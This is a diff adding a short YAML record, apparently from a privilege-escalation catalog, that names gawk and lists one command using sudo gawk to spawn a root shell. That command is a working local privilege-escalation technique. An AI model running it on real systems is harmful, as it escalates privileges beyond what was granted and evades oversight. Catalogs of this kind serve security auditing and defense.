@@ -1,0 +1,4 @@
+name: gawk
+binary_path: /usr/bin/gawk
+exploit_cmds:
+- sudo /usr/bin/gawk 'BEGIN {system("/bin/sh")}'
